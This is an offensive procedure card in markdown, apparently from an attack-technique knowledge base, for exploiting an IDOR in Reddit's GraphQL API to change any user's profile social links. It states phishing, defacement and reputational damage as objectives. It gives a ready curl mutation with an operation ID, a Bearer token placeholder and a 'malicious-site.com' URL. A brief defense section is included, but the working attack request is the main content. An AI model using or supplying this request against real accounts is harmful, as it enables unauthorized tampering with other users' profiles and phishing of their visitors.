---
id: proc-uuid-2
tags:
  - idor
  - graphql
  - modify
  - persistence
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/graphql-modify-reddit-social-link]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:25:48.155Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Modify-Reddit-User-Social-Link-via-IDOR

## Summary

This procedure uses an extracted social link ID to update any user's profile link via Reddit's GraphQL mutation, exploiting IDOR to alter outbound URLs, titles, and types without ownership verification.

## Description

The GraphQL mutation with ID 'c558e604581f' accepts an array of social links including the target ID and new details, applying changes directly to the user's profile. This can link to phishing sites or deface profiles. Requires a prior fetch to obtain the ID and a valid authenticated token.

## Requirements

1. Extracted social link ID from fetch step
2. Valid Reddit Bearer token
3. HTTP client for POST requests

## Defense

Defensive measures and detection strategies:

- Enforce ownership checks on all mutations using user ID vs requester ID
- Audit GraphQL inputs for mismatched object references
- Alert on profile changes from unauthorized sessions

## Objectives

1. Unauthorized modification of user social links
2. Insert malicious URLs for phishing or disruption
3. Persist changes to damage reputation

## Instructions

### Step 1: Prepare Mutation Payload

**Context**: Construct the input with the extracted ID and desired changes (e.g., malicious URL).

### Step 2: Execute Modification

**Context**: Send the GraphQL mutation to update the link.

**Command** ([[commands/graphql-modify-reddit-social-link]]):
```bash
curl -X POST https://gql.reddit.com/ \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  -d '{"id":"c558e604581f","variables":{"input":{"socialLinks":[{"outboundUrl":"https://malicious-site.com","title":"Fake Profile","type":"CUSTOM","id":"extracted_id"}]}}}'
```

> Successful execution returns a confirmation JSON without errors; the change propagates to the profile shortly after.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/graphql-modify-reddit-social-link]]

## Tools Used


## Tags

- idor
- graphql
- reddit
